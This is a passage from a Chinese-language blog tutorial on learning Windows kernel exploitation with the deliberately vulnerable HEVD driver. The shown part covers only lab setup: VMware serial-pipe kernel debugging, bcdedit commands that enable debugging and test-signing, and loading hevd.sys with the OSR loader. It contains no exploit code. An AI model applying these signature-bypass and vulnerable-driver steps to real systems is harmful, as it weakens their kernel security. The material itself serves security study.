<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="从0开始学习windows内核漏洞-HEVD篇">
<meta property="og:type" content="article">
<meta property="og:title" content="从0开始学习windows内核漏洞-HEVD篇">
<meta property="og:url" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/index.html">
<meta property="og:site_name" content="0xkami-blog">
<meta property="og:description" content="从0开始学习windows内核漏洞-HEVD篇">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210161404280.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210161417941.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210164516411.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210164603611.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210164611809.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210162206178.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210164727770.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210162651264.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210105358808.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164125027.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164154992.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164144263.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164112227.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164422968.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164847715.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210172145465.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210171445392.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210171721236.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216104616725.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216104637185.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216104653505.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216110457268.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216142639319.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216111959313.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216142815671.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216142826873.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216143422234.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216143503302.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216155549364.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216155834943.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216155937626.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220216155339673.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220211155004457.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220217150346522.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220217171459157.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220217171655895.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220217171758159.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220218133405073.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220224154105071.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220224162837607.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220218170603669.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220224163450742.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220224164928968.png">
<meta property="og:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220311151937772.png">
<meta property="article:published_time" content="2022-02-17T09:33:42.000Z">
<meta property="article:modified_time" content="2022-03-11T07:30:10.944Z">
<meta property="article:author" content="0xkami">
<meta property="article:tag" content="windows kernel expolit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210161404280.png">

<link rel="canonical" href="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>从0开始学习windows内核漏洞-HEVD篇 | 0xkami-blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">0xkami-blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">void</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/0xkami" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/head.png">
      <meta itemprop="name" content="0xkami">
      <meta itemprop="description" content="If you want me,satisfy me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0xkami-blog">
    </span>
      <header class="post-header" style="background-color: rgba(255,255,255,0.8);padding: 15px 0px;border-radius: 10px;margin-bottom: 60px">
        <h1 class="post-title" itemprop="name headline">
          从0开始学习windows内核漏洞-HEVD篇
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-02-17 17:33:42" itemprop="dateCreated datePublished" datetime="2022-02-17T17:33:42+08:00">2022-02-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-11 15:30:10" itemprop="dateModified" datetime="2022-03-11T15:30:10+08:00">2022-03-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody" style="background-color: rgba(255,255,255,0.8);padding: 15px; border-radius: 10px;">

      
        <h3 id="从0开始学习windows内核漏洞-HEVD篇"><a href="#从0开始学习windows内核漏洞-HEVD篇" class="headerlink" title="从0开始学习windows内核漏洞-HEVD篇"></a>从0开始学习windows内核漏洞-HEVD篇</h3><a id="more"></a>

<h4 id="0x0-环境搭建"><a href="#0x0-环境搭建" class="headerlink" title="0x0 环境搭建"></a>0x0 环境搭建</h4><h5 id="0x01-双机调试环境搭建"><a href="#0x01-双机调试环境搭建" class="headerlink" title="0x01 双机调试环境搭建"></a>0x01 双机调试环境搭建</h5><h6 id="所需工具："><a href="#所需工具：" class="headerlink" title="所需工具："></a>所需工具：</h6><p>1、一个win7 sp x86虚拟机</p>
<p>2、由于本机是mac，所以用一个win10虚拟机当调试机（没法用virtualkd）（用的串口，内存16G开调试并不卡）</p>
<h6 id="搭建过程："><a href="#搭建过程：" class="headerlink" title="搭建过程："></a>搭建过程：</h6><blockquote>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-222660.htm">https://bbs.pediy.com/thread-222660.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cxccc/p/13054553.html">https://www.cnblogs.com/cxccc/p/13054553.html</a></p>
</blockquote>
<p>1、修改两个虚拟机的.vmx文件</p>
<p>被调试机win7：</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210161404280.png" alt="image-20220210161404280"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210161417941.png" alt="image-20220210161417941"></p>
<p>删除所有serial0相关字段，新增以下配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serial0.present &#x3D; &quot;TRUE&quot;</span><br><span class="line">serial0.fileType &#x3D; &quot;pipe&quot;</span><br><span class="line">serial0.fileName &#x3D; &quot;&#x2F;private&#x2F;tmp&#x2F;com1&quot;</span><br><span class="line">serial0.tryNoRxLoss &#x3D; &quot;FALSE&quot;</span><br><span class="line">serial0.pipe.endPoint &#x3D; &quot;server&quot;</span><br></pre></td></tr></table></figure>

<p>调试机win10：</p>
<p>删除所有serial0相关字段，新增以下配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serial0.present &#x3D; &quot;TRUE&quot;</span><br><span class="line">serial0.fileType &#x3D; &quot;pipe&quot;</span><br><span class="line">serial0.fileName &#x3D; &quot;&#x2F;private&#x2F;tmp&#x2F;com1&quot;</span><br><span class="line">serial0.tryNoRxLoss &#x3D; &quot;FALSE&quot;</span><br><span class="line">serial0.pipe.endPoint &#x3D; &quot;client&quot;</span><br></pre></td></tr></table></figure>

<p>2、修改被调试机win7的开机启动项</p>
<p>以管理员权限打开CMD，依次输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bcdedit &#x2F;copy &#123;current&#125; &#x2F;d &quot;Windows Debug Entry&quot;</span><br><span class="line">bcdedit &#x2F;dbgsettings serial baudrate:115200 debugport:1</span><br><span class="line">bcdedit &#x2F;debug &#123;提供的标识符&#125; ON</span><br><span class="line">bcdedit &#x2F;set &#123;提供的标识符&#125; TESTSIGNING on</span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210164516411.png" alt="image-20220210164516411"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210164603611.png" alt="image-20220210164603611"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210164611809.png" alt="image-20220210164611809"></p>
<p>3、在调试机win10的windbg中设置内核调试的参数</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210162206178.png" alt="image-20220210162206178"></p>
<p>4、确定windbg参数，点击后发现windbg在等待连接了，重启win7后进入调试，即可发现成功连接</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210164727770.png" alt="image-20220210164727770"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210162651264.png" alt="image-20220210162651264"></p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220210105358808.png" alt="image-20220210105358808"></p>
<h6 id="出现的问题："><a href="#出现的问题：" class="headerlink" title="出现的问题："></a>出现的问题：</h6><p>（1）win7 sp x86虚拟机没法安装vmware tools</p>
<p>如图，按钮是灰色的</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164125027.png" alt="image-20220209164125027"></p>
<p><strong>解决方法：</strong></p>
<p>参考<a target="_blank" rel="noopener" href="https://cyhour.com/1645/">https://cyhour.com/1645/</a></p>
<p>1、找到vmware里的windows.iso</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164154992.png" alt="image-20220209164154992"></p>
<p>2、设置为虚拟机的cd/dvd</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164144263.png" alt="image-20220209164144263"></p>
<p>3、开启虚拟机后即可点击打开vmware tools的安装包</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164112227.png" alt="image-20220209164112227"></p>
<p>4、安装过程中出现错误</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164422968.png" alt="image-20220209164422968"></p>
<p>5、下载kb4474419：<a target="_blank" rel="noopener" href="https://www.catalog.update.microsoft.com/Search.aspx?q=4474419">kb4474419</a>（ps:参考文章中链接失效了，重新找了官网的链接）并安装</p>
<p><img src="/2022/02/17/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E-HEVD%E7%AF%87/image-20220209164847715.png" alt="image-20220209164847715"></p>
<p>6、重新安装vmware tools即可</p>
<p>（2）无法使用com2连接</p>
<p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cxccc/p/13054553.html%E7%9A%84%E9%85%8D%E7%BD%AE">https://www.cnblogs.com/cxccc/p/13054553.html的配置</a></p>
<h5 id="0x02-HEVD搭建"><a href="#0x02-HEVD搭建" class="headerlink" title="0x02 HEVD搭建"></a>0x02 HEVD搭建</h5><h6 id="所需工具：-1"><a href="#所需工具：-1" class="headerlink" title="所需工具："></a>所需工具：</h6><p>1、<a target="_blank" rel="noopener" href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a></p>
<p>2、<a target="_blank" rel="noopener" href="https://www.osronline.com/OsrDown.cfm/osrloaderv30.zip%5Ename=osrloaderv30.zip&id=157">OSR驱动加载器</a></p>
<h6 id="搭建过程：-1"><a href="#搭建过程：-1" class="headerlink" title="搭建过程："></a>搭建过程：</h6><p>打开被调试机win7</p>
<p>打开osr driver loader，driver path设置为hevd.sys的路径</p>
